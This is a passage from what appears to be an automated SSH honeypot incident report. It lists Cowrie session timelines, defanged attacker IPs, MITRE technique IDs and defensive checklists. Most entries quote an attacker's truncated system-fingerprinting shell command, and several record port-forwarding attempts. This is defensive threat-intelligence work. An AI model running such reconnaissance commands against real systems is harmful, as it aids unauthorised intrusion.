| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:26:35` | `cowrie.session.connect` |
| `2026-08-03 07:26:35` | `cowrie.client.version` |
| `2026-08-03 07:26:36` | `cowrie.client.kex` |
| `2026-08-03 07:26:36` | `cowrie.login.success` |
| `2026-08-03 07:26:37` | `cowrie.session.params` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.success` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.command.input` |
| `2026-08-03 07:26:37` | `cowrie.log.closed` |
| `2026-08-03 07:26:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d0d7665f4ea

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:28 |
| **Last Seen** | 2026-08-03 07:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:28:24` | `cowrie.session.connect` |
| `2026-08-03 07:28:24` | `cowrie.client.version` |
| `2026-08-03 07:28:24` | `cowrie.client.kex` |
| `2026-08-03 07:28:25` | `cowrie.login.success` |
| `2026-08-03 07:28:26` | `cowrie.session.params` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.success` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.command.input` |
| `2026-08-03 07:28:26` | `cowrie.log.closed` |
| `2026-08-03 07:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9dee30ce9b8

| Field | Detail |
|---|---|
| **Source IP** | `60.172.54[.]36` |
| **First Seen** | 2026-08-03 07:29 |
| **Last Seen** | 2026-08-03 07:30 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:29:59` | `cowrie.session.connect` |
| `2026-08-03 07:30:00` | `cowrie.client.version` |
| `2026-08-03 07:30:00` | `cowrie.client.kex` |
| `2026-08-03 07:30:03` | `cowrie.login.success` |
| `2026-08-03 07:30:04` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:30:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.172.54[.]36` to AbuseIPDB if not already reported
- [ ] Block `60.172.54[.]36` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f9a7e9a7e1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:30 |
| **Last Seen** | 2026-08-03 07:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:30:19` | `cowrie.session.connect` |
| `2026-08-03 07:30:19` | `cowrie.client.version` |
| `2026-08-03 07:30:19` | `cowrie.client.kex` |
| `2026-08-03 07:30:20` | `cowrie.login.success` |
| `2026-08-03 07:30:21` | `cowrie.session.params` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.success` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.command.input` |
| `2026-08-03 07:30:21` | `cowrie.log.closed` |
| `2026-08-03 07:30:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9d194bf509

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:31 |
| **Last Seen** | 2026-08-03 07:32 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:31:59` | `cowrie.session.connect` |
| `2026-08-03 07:31:59` | `cowrie.client.version` |
| `2026-08-03 07:31:59` | `cowrie.client.kex` |
| `2026-08-03 07:32:00` | `cowrie.login.success` |
| `2026-08-03 07:32:01` | `cowrie.session.params` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.success` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.command.input` |
| `2026-08-03 07:32:01` | `cowrie.log.closed` |
| `2026-08-03 07:32:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b64c82939fd

| Field | Detail |
|---|---|
| **Source IP** | `200.159.14[.]187` |
| **First Seen** | 2026-08-03 07:32 |
| **Last Seen** | 2026-08-03 07:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:32:48` | `cowrie.session.connect` |
| `2026-08-03 07:32:48` | `cowrie.client.version` |
| `2026-08-03 07:32:48` | `cowrie.client.kex` |
| `2026-08-03 07:32:50` | `cowrie.login.success` |
| `2026-08-03 07:32:50` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.159.14[.]187` to AbuseIPDB if not already reported
- [ ] Block `200.159.14[.]187` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc37aa8f690b

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]44` |
| **First Seen** | 2026-08-03 07:33 |
| **Last Seen** | 2026-08-03 07:33 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:33:00` | `cowrie.session.connect` |
| `2026-08-03 07:33:01` | `cowrie.client.version` |
| `2026-08-03 07:33:01` | `cowrie.client.kex` |
| `2026-08-03 07:33:04` | `cowrie.login.success` |
| `2026-08-03 07:33:04` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a10e4fa1c67f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:33 |
| **Last Seen** | 2026-08-03 07:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:33:43` | `cowrie.session.connect` |
| `2026-08-03 07:33:43` | `cowrie.client.version` |
| `2026-08-03 07:33:43` | `cowrie.client.kex` |
| `2026-08-03 07:33:43` | `cowrie.login.success` |
| `2026-08-03 07:33:44` | `cowrie.session.params` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.success` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.command.input` |
| `2026-08-03 07:33:44` | `cowrie.log.closed` |
| `2026-08-03 07:33:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a360d122b52

| Field | Detail |
|---|---|
| **Source IP** | `92.255.196[.]185` |
| **First Seen** | 2026-08-03 07:35 |
| **Last Seen** | 2026-08-03 07:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:35:22` | `cowrie.session.connect` |
| `2026-08-03 07:35:22` | `cowrie.client.version` |
| `2026-08-03 07:35:22` | `cowrie.client.kex` |
| `2026-08-03 07:35:24` | `cowrie.login.success` |
| `2026-08-03 07:35:24` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.255.196[.]185` to AbuseIPDB if not already reported
- [ ] Block `92.255.196[.]185` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb2018da2358

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:35 |
| **Last Seen** | 2026-08-03 07:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:35:43` | `cowrie.session.connect` |
| `2026-08-03 07:35:44` | `cowrie.client.version` |
| `2026-08-03 07:35:44` | `cowrie.client.kex` |
| `2026-08-03 07:35:44` | `cowrie.login.success` |
| `2026-08-03 07:35:45` | `cowrie.session.params` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.success` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.command.input` |
| `2026-08-03 07:35:45` | `cowrie.log.closed` |
| `2026-08-03 07:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9702f1178b5a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:39 |
| **Last Seen** | 2026-08-03 07:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:39:00` | `cowrie.session.connect` |
| `2026-08-03 07:39:00` | `cowrie.client.version` |
| `2026-08-03 07:39:00` | `cowrie.client.kex` |
| `2026-08-03 07:39:01` | `cowrie.login.success` |
| `2026-08-03 07:39:01` | `cowrie.session.params` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.success` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:01` | `cowrie.command.input` |
| `2026-08-03 07:39:02` | `cowrie.log.closed` |
| `2026-08-03 07:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-475e59e0520d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:41 |
| **Last Seen** | 2026-08-03 07:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:41:18` | `cowrie.session.connect` |
| `2026-08-03 07:41:18` | `cowrie.client.version` |
| `2026-08-03 07:41:18` | `cowrie.client.kex` |
| `2026-08-03 07:41:20` | `cowrie.login.success` |
| `2026-08-03 07:41:21` | `cowrie.session.params` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.success` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.command.input` |
| `2026-08-03 07:41:21` | `cowrie.log.closed` |
| `2026-08-03 07:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c745dd7ed14e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:43 |
| **Last Seen** | 2026-08-03 07:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:43:05` | `cowrie.session.connect` |
| `2026-08-03 07:43:05` | `cowrie.client.version` |
| `2026-08-03 07:43:05` | `cowrie.client.kex` |
| `2026-08-03 07:43:06` | `cowrie.login.success` |
| `2026-08-03 07:43:07` | `cowrie.session.params` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.success` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:07` | `cowrie.command.input` |
| `2026-08-03 07:43:08` | `cowrie.log.closed` |
| `2026-08-03 07:43:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ff06b910a98

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:44 |
| **Last Seen** | 2026-08-03 07:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:44:53` | `cowrie.session.connect` |
| `2026-08-03 07:44:53` | `cowrie.client.version` |
| `2026-08-03 07:44:53` | `cowrie.client.kex` |
| `2026-08-03 07:44:55` | `cowrie.login.success` |
| `2026-08-03 07:44:56` | `cowrie.session.params` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.success` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.command.input` |
| `2026-08-03 07:44:56` | `cowrie.log.closed` |
| `2026-08-03 07:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7067719be6b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:46 |
| **Last Seen** | 2026-08-03 07:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
